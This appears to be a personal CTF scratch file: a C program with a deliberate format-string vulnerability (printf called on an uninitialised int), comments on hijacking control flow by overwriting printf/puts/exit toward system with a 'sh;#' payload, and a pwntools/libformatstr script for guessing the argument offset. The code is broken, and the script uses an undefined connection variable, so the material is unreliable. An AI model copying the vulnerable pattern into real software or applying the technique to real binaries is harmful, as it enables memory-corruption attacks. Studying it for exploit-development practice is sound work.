#include <stdio.h>

int main()
{
    int banana;
    int secret = 0;
    printf(banana);

    return 0;
}

/*

Use "sh;#[format string]" and point address to a function like system <-- not entirely sure

Pass input as arguement 
./format $(python -c 'print "A"')

Global variables are in .bss
objdump -t <file> | grep <var name>

You need to overwrite some function after the printf() --> Good item to overwrite a function called twice but once may work also
Often overwrite printf/puts/exit

Use len(s) to calculate offset dynamically

*/

/*
Example libformatstring script
#!/usr/bin/env python

from libformatstr import *
from pwn import *
import sys

bufsize = 1000
r.send(make_pattern(bufsize) + "\n")
data = r.recv()
offset, padding = guess_argnum(data, bufsize)
log.info("offset: " + str(offset))
log.info("padding: " + str(padding))

#padding between 0-4 on 32bit
#padding between 0-8 on 64bit
r.close()
*/




